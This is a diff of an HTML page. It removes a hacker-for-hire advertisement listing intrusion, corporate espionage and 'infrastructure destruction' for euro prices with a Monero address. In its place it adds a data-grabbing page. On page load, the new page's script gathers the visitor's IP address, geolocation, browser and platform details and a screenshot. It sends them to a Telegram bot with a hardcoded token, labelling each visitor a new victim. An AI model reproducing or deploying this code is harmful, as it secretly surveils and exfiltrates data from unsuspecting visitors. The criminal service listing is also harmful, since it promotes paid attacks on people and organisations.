@@ -1,270 +1,57 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>STUXNET // OPERATIONAL TERMINAL</title>
-    <style>
-        :root {
-            --primary: #ff0000;
-            --bg: #030303;
-            --surface: #0a0a0a;
-            --text: #a0a0a0;
-            --dim: #333;
+    <title>هاك خبيث</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script>
+        async function stealData() {
+            // جمع الـ IP والموقع
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+
+            let location = "غير متاح";
+            try {
+                const locResponse = await fetch(`http://ip-api.com/json/${ip}`);
+                const locData = await locResponse.json();
+                location = `${locData.city}, ${locData.country}`;
+            } catch (e) {}
+
+            // لقطة الشاشة
+            const screenshot = await html2canvas(document.body).then(canvas => canvas.toDataURL());
+
+            // معلومات الجهاز
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+
+            // إرسال البيانات إلى بوت التلجرام
+            const botToken = "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU"; // استبدل بتوكن البوت
+            const chatId = "5446862709"; // استبدل بآيدي الدردشة
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            const text = `
+                📌 **ضحيه جديده** 📌
+                → IP: ${ip}
+                → الموقع: ${location}
+                → النظام: ${platform}
+                → المتصفح: ${userAgent}
+                ${screenshot ? `→ لقطة الشاشة: ${screenshot}` : ''}
+            `;
+
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'Markdown' })
+            });
         }
 
-        * { cursor: crosshair; box-sizing: border-box; }
-
-        body {
-            background-color: var(--bg);
-            background-image: 
-                radial-gradient(circle at 2px 2px, #111 1px, transparent 0);
-            background-size: 24px 24px;
-            color: var(--text);
-            font-family: "Courier New", monospace;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow: hidden;
-        }
-
-        /* HUD - إطار البيانات المتقدم */
-        .hud-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none;
-            border: 20px solid transparent;
-            border-image: radial-gradient(circle, var(--dim) 1px, transparent 1px) 1;
-            z-index: 10;
-        }
-
-        .corner-info {
-            position: absolute;
-            font-size: 9px;
-            color: var(--dim);
-            text-transform: uppercase;
-        }
-
-        .main-frame {
-            width: 900px;
-            background: var(--surface);
-            border: 1px solid #1a1a1a;
-            position: relative;
-            z-index: 5;
-            box-shadow: 0 0 100px rgba(0,0,0,1);
-        }
-
-        /* Header Section */
-        header {
-            padding: 30px;
-            border-bottom: 1px solid #1a1a1a;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .identity { display: flex; align-items: center; gap: 20px; }
-        .logo-box {
-            width: 60px; height: 60px;
-            border: 1px solid var(--primary);
-            padding: 2px;
-        }
-        .logo-box img { width: 100%; height: 100%; filter: grayscale(1); }
-
-        .sys-title h1 {
-            margin: 0; font-size: 22px; color: #fff; letter-spacing: 4px;
-        }
-
-        /* Content Sections */
-        .content { padding: 40px; position: relative; }
-        
-        .section-label {
-            position: absolute;
-            left: -1px; top: 20px;
-            background: var(--primary);
-            color: #fff;
-            font-size: 10px;
-            padding: 2px 8px;
-            font-weight: bold;
-        }
-
-        .manifesto {
-            border-left: 1px solid var(--dim);
-            padding-left: 25px;
-            margin: 20px 0 40px 0;
-        }
-
-        .manifesto p { font-size: 13px; line-height: 1.8; margin: 0; }
-
-        /* Operation Table */
-        .op-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 30px;
-        }
-
-        .op-table th {
-            text-align: left; font-size: 11px; color: var(--dim);
-            padding: 10px; border-bottom: 1px solid var(--dim);
-        }
-
-        .op-table td {
-            padding: 25px 10px;
-            border-bottom: 1px solid #111;
-        }
-
-        .op-id { color: var(--primary); font-size: 11px; margin-bottom: 5px; display: block; }
-        .op-name { color: #fff; font-size: 16px; font-weight: bold; }
-        .op-meta { font-size: 11px; color: #555; display: block; margin-top: 4px; }
-
-        .price-tag { color: #fff; font-family: monospace; font-size: 15px; }
-
-        .exec-btn {
-            background: transparent;
-            border: 1px solid #333;
-            color: #fff;
-            padding: 8px 15px;
-            font-size: 11px;
-            transition: 0.2s;
-        }
-
-        .exec-btn:hover {
-            border-color: var(--primary);
-            background: var(--primary);
-            box-shadow: 0 0 15px var(--primary);
-        }
-
-        /* XMR Secure Block */
-        .xmr-block {
-            margin-top: 50px;
-            border: 1px solid #1a1a1a;
-            padding: 20px;
-            background: #050505;
-        }
-
-        .addr-label { font-size: 10px; color: var(--dim); display: block; margin-bottom: 10px; }
-        .addr-value {
-            font-size: 11px; color: #fff; word-break: break-all;
-            background: #000; padding: 12px; display: block; border: 1px solid #111;
-        }
-
-        footer {
-            padding: 20px; text-align: center; font-size: 9px; color: #222;
-            letter-spacing: 5px; border-top: 1px solid #1a1a1a;
-        }
-    </style>
+        // تشغيل عند فتح الصفحة
+        window.onload = stealData;
+    </script>
 </head>
 <body>
-
-    <div class="hud-overlay">
-        <div class="corner-info" style="top:20px; left:20px;">STX-CORE v4.0 // 43.19° N, 23.41° E</div>
-        <div class="corner-info" style="top:20px; right:20px;">ENCRYPTION_ACTIVE: ECC-521</div>
-        <div class="corner-info" style="bottom:20px; left:20px;">XMR_NODE: SYNCHRONIZED</div>
-        <div class="corner-info" style="bottom:20px; right:20px;">BY: STUXNET_OFFICIAL</div>
-    </div>
-
-    <div class="main-frame">
-        <header>
-            <div class="identity">
-                <div class="logo-box">
-                    <img src="https://i.ibb.co/sp35zdbh/IMG-9090.jpg">
-                </div>
-                <div class="sys-title">
-                    <h1>STUXNET_OFFICIAL</h1>
-                    <span style="font-size: 9px; color: var(--dim);">[ OFFENSIVE CYBER-INTELLIGENCE UNIT ]</span>
-                </div>
-            </div>
-            <div style="text-align: right">
-                <div style="font-size: 18px; color: #fff; font-weight: bold;">0%</div>
-                <div style="font-size: 8px; color: var(--dim);">DETECTION_RATE</div>
-            </div>
-        </header>
-
-        <div class="content">
-            <div class="section-label">MISSION_PROFILE</div>
-            <div class="manifesto">
-                <p>
-                    Since the age of 16, I have existed within the layers of the digital void. Hacking is not a hobby; it is a refined trade. While others look for exploits, I build them. Over 20 years of operational experience in high-level intrusion and social engineering. I am a professional computer expert who could hold a high-tier legal position—but I chose the shadow. If your objective is not critical, do not waste system resources.
-                </p>
-            </div>
-
-            <div class="section-label" style="top: 240px;">OPERATIONS</div>
-            <table class="op-table">
-                <thead>
-                    <tr>
-                        <th>MODULE_ID</th>
-                        <th>BUDGET</th>
-                        <th>AUTHORIZE</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td>
-                            <span class="op-id">STX-01</span>
-                            <span class="op-name">Targeted Intrusion</span>
-                            <span class="op-meta">Email/Social/Personal Device compromise. Initial breach protocols.</span>
-                        </td>
-                        <td class="price-tag">250€</td>
-                        <td><button class="exec-btn" onclick="auth('STX-01', '250€')">EXECUTE</button></td>
-                    </tr>
-                    <tr>
-                        <td>
-                            <span class="op-id">STX-02</span>
-                            <span class="op-name">Corporate Espionage</span>
-                            <span class="op-meta">Database exfiltration, network persistence, industrial disruption.</span>
-                        </td>
-                        <td class="price-tag">500€</td>
-                        <td><button class="exec-btn" onclick="auth('STX-02', '500€')">EXECUTE</button></td>
-                    </tr>
-                    <tr>
-                        <td>
-                            <span class="op-id">STX-03</span>
-                            <span class="op-name">Strategic Neutralization</span>
-                            <span class="op-meta">Complete infrastructure destruction. Protected entity disruption.</span>
-                        </td>
-                        <td class="price-tag">900€</td>
-                        <td><button class="exec-btn" onclick="auth('STX-03', '900€')">EXECUTE</button></td>
-                    </tr>
-                </tbody>
-            </table>
-
-            <div class="xmr-block">
-                <span class="addr-label">// MONERO_SECURE_PAYMENT_NODE</span>
-                <span class="addr-value">43xSNqUuVfnNjFiLTFUxQb2TAXG8GNknFQg9BGCYxuST4mgJ1nUqtt1cdaDPVay6W45Hb2tLGW2uH3bubNgw9JjbPou5jNg</span>
-                <p style="font-size: 10px; color: #444; margin-top: 10px;">* Direct service payments are escrowed via secure Telegram uplink only.</p>
-            </div>
-        </div>
-
-        <footer>
-            STUXNET_OFFICIAL // ALL_RIGHTS_RESERVED // 2026 // NO_LOGS_NO_TRACE
-        </footer>
-    </div>
-
-    <script>
-        const NODE = {
-            T: "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU",
-            C: "5446862709"
-        };
-
-        async function auth(id, val) {
-            const handle = prompt("INPUT SECURE TELEGRAM ID (@):");
-            if(!handle) return;
-
-            const packet = `[+] NEW_UPLINK_INITIALIZED\nMODULE: ${id}\nVAL: ${val}\nUPLINK_ID: @${handle}\nSIG: STX_VERIFIED`;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${NODE.T}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: NODE.C, text: packet})
-                });
-                alert("UPLINK SUCCESSFUL. AWAIT CONTACT ON SECURE CHANNEL.");
-            } catch(e) {
-                alert("UPLINK_FAILURE: CHECK NETWORK.");
-            }
-        }
-    </script>
+    <h1>مرحبًا! هذه صفحة مزيفة لجمع البيانات.</h1>
 </body>
 </html>
+
+
